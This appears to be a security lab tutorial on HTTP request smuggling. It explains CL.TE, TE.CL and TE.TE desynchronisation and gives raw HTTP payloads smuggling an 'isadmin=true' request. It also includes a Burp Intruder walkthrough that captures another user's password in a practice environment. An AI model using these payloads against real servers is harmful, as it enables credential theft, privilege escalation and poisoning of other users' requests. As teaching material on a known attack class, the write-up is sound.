# HTTP Request Smuggling

HTTP Request Smuggling occurs when front-end and back-end HTTP components interpret request boundaries differently. Affected components commonly include reverse proxies, load balancers, WAFs, and application servers.

The vulnerability mainly involves inconsistent handling of:

* `Content-Length`
* `Transfer-Encoding`

If these headers are parsed differently, one request can bleed into another, causing HTTP desynchronization.

Request smuggling relies on:

* Keep-alive connections
* HTTP pipelining
* Shared TCP connections

Without persistent connections, desync attacks are not possible.

When calculating `Content-Length` or chunk sizes, include `\r` `\n`

These characters are part of the payload formatting and affect size calculations.

Some tools automatically recalculate `Content-Length`, which can break payloads during testing. Disable automatic correction when required.

Testing on production systems can cause:

* Cache poisoning
* Broken user requests
* Session mixups
* Back-end desynchronization

**Use caution.**

## 0. Web Infrastructure Components

HTTP request smuggling usually occurs in layered web infrastructures where multiple systems process the same request before it reaches the application.

A **reverse proxy** sits between clients and back-end servers, forwarding requests while handling tasks such as routing, filtering, SSL termination, caching, and access control. Common examples include:

* NGINX
* Apache `mod_proxy`
* Varnish

**Load balancers** are a specific, functional type of reverse proxy which distribute traffic across multiple servers to improve availability and prevent overload. Examples include:

* AWS ELB
* HAProxy
* F5 BIG-IP

These systems often implement caching mechanisms to reduce server load and improve response times. Common caching types include:

* Content caching
* Database query caching
* Full-page caching
* Edge caching/CDNs
* API caching

A **WAF (Web Application Firewall)** operates within this request chain to inspect and filter HTTP traffic before it reaches the application. WAFs commonly:

* Block malicious requests
* Enforce request validation
* Apply rate limiting

Because request smuggling targets differences in HTTP parsing behavior, **any component in this chain, including proxies, load balancers, caches, or WAFs, can become part of the desynchronization issue** if it interprets requests differently from the back-end server.

**Typical Back-End Components:**

* App server
* Framework
* API server
* Origin server

Request smuggling exists when front-end and back-end systems disagree on where an HTTP request ends.

## 1. Request Smuggling CL.TE

**CL.TE (Content-Length / Transfer-Encoding)** request smuggling occurs when front-end and back-end servers prioritize HTTP headers differently while determining where a request ends.

Typically:

* The front end uses `Content-Length`
* The back end uses `Transfer-Encoding`

This mismatch allows attackers to craft ambiguous requests that each server interprets differently.

For example, if a request contains both headers, the front-end server may trust the `Content-Length` value and treat the request as complete after a fixed number of bytes. Meanwhile, the back-end server may ignore `Content-Length` and process the request using `Transfer-Encoding: chunked`. This difference can cause part of the request to be interpreted as a second HTTP request.

### Exploiting CL.TE

A CL.TE attack works by desynchronizing request boundaries between the front end and back end.

Example payload:

```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```

In this example:

* The front end trusts `Content-Length: 130` and forwards the entire payload as one request.
* The back end trusts `Transfer-Encoding: chunked` and treats `0` as the end of the chunked body.

As a result, the following request:

```http
POST /update HTTP/1.1
```

may be processed as a separate request by the back end, potentially leading to unauthorized actions.

### Incorrect Content-Length

Successful request smuggling depends heavily on accurate size calculations. If `Content-Length` does not match the actual body size, the server may:

* Truncate the request body
* Ignore part of the payload
* Fail to process the smuggled request correctly

Example request body:

```http
username=test&query=test
```

Actual size: `24 bytes`

![burpsuite repeater page](/img/HTTPRequestSmuggling/1.png)

In this scenario, the `/submissions` directory can be used to verify how much of the body was processed and stored.

![checking the submission](/img/HTTPRequestSmuggling/2.png)

If `Content-Length` is smaller than the actual body size, the back end reads only the specified number of bytes. For example:

```http
Content-Length: 10
```

![burpsuite repeater page with wrong content length](/img/HTTPRequestSmuggling/3.png)

The server processes only:

```txt
username=t
```

![checking the submission2](/img/HTTPRequestSmuggling/4.png)

**while the remaining bytes stay in the connection buffer and may interfere with the next request, which is the core behavior exploited in request smuggling attacks.**

## 2. Request Smuggling TE.CL

**TE.CL (Transfer-Encoding / Content-Length)** is the reverse of the **CL.TE** technique.

In this case:

* The front end uses `Transfer-Encoding`
* The back end uses `Content-Length`

The vulnerability appears when both servers prioritize different headers to determine where the request ends.

If a request contains both headers, the front end processes it as chunked data using `Transfer-Encoding: chunked`, while the back end ignores chunked encoding and trusts the `Content-Length` value instead. This parsing mismatch can desynchronize the connection and allow request smuggling.

### Exploiting TE.CL

Example payload:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```

In this payload:

* The front end trusts `Transfer-Encoding: chunked`
* `78` (hex `0x78`) tells the front end that the next 120 bytes belong to the request body
* The front end continues reading until it reaches `0`, which marks the end of the chunked body

The back end behaves differently:

* It ignores `Transfer-Encoding`
* It trusts: `Content-Length: 4`

* Only the first 4 bytes are processed as the request body

Everything after those 4 bytes remains in the connection buffer and is interpreted as a new HTTP request. As a result:

```http
POST /update HTTP/1.1
```

may be processed independently by the back end.

The smuggled request contains:

```txt
isadmin=true
```

Depending on the application, this could:

* Modify application state
* Bypass security controls
* Escalate privileges
* Poison other users' requests

CL.TE and TE.CL are basically two systems reading the same HTTP packet and confidently reaching different conclusions.

## 3. Transfer-Encoding Obfuscation (TE.TE)

TE.TE (Transfer-Encoding / Transfer-Encoding) occurs when both the front end and back end use the `Transfer-Encoding` header, but interpret malformed or duplicated headers differently.

Unlike CL.TE or TE.CL, this technique does not rely on disagreement between `Content-Length` and `Transfer-Encoding`. Instead, it abuses inconsistent parsing of malformed `Transfer-Encoding` headers.

In many cases, only a single malformed header is required. One server may:

* Ignore the malformed value
* Normalize the header
* Fall back to `Content-Length`

while the other server continues processing the request as chunked data.

This parsing inconsistency can indirectly create a:

* CL.TE scenario
* TE.CL scenario

depending on which component falls back to `Content-Length`.

### Exploiting TE.TE

Attackers typically manipulate the `Transfer-Encoding` header using malformed or non-standard values.

Example payload:

```http
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
```

In this payload:

* The front end encounters two `Transfer-Encoding` headers
* `chunked` is valid
* `chunked1` is malformed/non-standard

The front end may:

* Ignore `chunked1`
* Trust the valid `chunked` header
* Process everything up to `0` as one chunked request body

The back end may behave differently:

* Reject the malformed header
* Ignore `Transfer-Encoding`
* Fall back to:

```http
Content-length: 4
```

If that happens, the back end reads only the first 4 bytes and treats the remaining data as a new request.

As a result:

```http
POST /update HTTP/1.1
```

may be interpreted as a separate back-end request.

## 4. Practical Scenario

The vulnerable environment uses:

* ATS (Apache Traffic Server) as the front-end proxy
* NGINX as the back-end web server
* PHP for dynamic content processing

Because ATS and NGINX prioritize `Content-Length` and `Transfer-Encoding` differently, the application becomes vulnerable to HTTP request smuggling.

### 4.1 Assessing the Application

The application contains:

* Home page
* Login page
* Contact form

Submitted contact requests are stored in the `/submissions` directory for demonstration purposes.

![Applicaation overview](/img/HTTPRequestSmuggling/5.png)

### 4.2 Exploiting the Application

Using Burp Suite Proxy, intercept a request to the application's index page. This request will be used as the baseline payload.

![Burpsuite's proxy](/img/HTTPRequestSmuggling/6.png)

**Payload:**

```http
POST / HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Transfer-Encoding: chunked

0

POST /contact.php HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

username=test&query=§
```

**Payload Breakdown:**

This is a CL.TE desync attack:

* The front end (ATS) trusts `Content-Length`
* The back end (NGINX) trusts `Transfer-Encoding`

The front end reads 160 bytes and forwards everything as a single request.

The back end processes `0` as the end of the chunked body, then interprets:

```http
POST /contact.php HTTP/1.1
```

as a separate request.

The smuggled request is queued in the back-end connection and may become attached to another user's request.

### Intruder Configuration

**Payload Positions:**

Place the payload marker at:

```txt
username=test&query=§
```

![img](/img/HTTPRequestSmuggling/7.png)

This allows Burp Intruder to repeatedly resend the exact smuggling payload while appending incoming victim data after the queued request.

**Payload Type: Null Payloads:**

Set:

* Payload type → **Null payloads**
* Number of payloads → `10000`

![img](/img/HTTPRequestSmuggling/8.png)

Reason:

* Null payloads resend the request without modifying it
* Request smuggling payloads are highly sensitive to formatting and size changes
* Prevents Burp from injecting additional data that could break the desync condition

Sending many payloads increases the chance of capturing another user's request on the shared back-end connection.

**Resource Pool Configuration:**

Create a new resource pool using the settings shown below:

![img](/img/HTTPRequestSmuggling/9.png)

Reason:

* Controls concurrency and connection reuse
* Keeps requests synchronized over the same TCP connection
* Prevents Burp from flooding the server with parallel requests that could break the desync state

Request smuggling often fails without controlled timing and connection handling.

**Launching the Attack:**

Start the Intruder attack:

![img](/img/HTTPRequestSmuggling/10.png)

After several minutes, inspect the `/submissions` directory.

If successful, the smuggled request will contain parts of another user's request appended to:

```txt
query=
```

![img](/img/HTTPRequestSmuggling/11.png)

Review the stored text files and search for credentials or sensitive data captured from victim requests.

![img](/img/HTTPRequestSmuggling/12.png)

Use the recovered password to authenticate to the application.

### Understanding the Scenario

This lab demonstrates how HTTP request smuggling can poison a shared back-end connection and capture parts of another user's request.

The `/contact.php` endpoint stores submitted queries inside the `/submissions` directory. The attacker abuses this functionality by smuggling a hidden request to `/contact.php` through the front-end proxy.

Attack flow:

1. The attacker sends a malicious request to `/`
2. A second hidden request to `/contact.php` is appended inside the request body
3. The front end (ATS) trusts `Content-Length` and forwards the payload as a single request
4. The back end (NGINX) trusts `Transfer-Encoding` and interprets the hidden request as a separate request
5. The smuggled `/contact.php` request remains queued in the back-end connection
6. When another user sends a request, part of their request becomes appended to the queued smuggled request
7. The application stores the captured data inside `/submissions`
8. The attacker reads the stored data and extracts sensitive information such as credentials

In this lab, part of another user's login request becomes appended to `query=`

allowing the attacker's smuggled request to capture the victim's password.

This lab is intentionally simplified for demonstration purposes. Real-world applications usually do not expose captured requests through readable directories. However, the desynchronization behavior itself is realistic.

In real environments, HTTP request smuggling is commonly used for:

* Session hijacking
* Cache poisoning
* Credential theft
* Authentication bypass
* WAF bypass
* Internal API access
* Request routing manipulation

The key concept is not the `/contact.php` endpoint itself, but the desynchronization issue where: one user's request becomes mixed with another user's request due to inconsistent HTTP parsing between front-end and back-end servers.

---
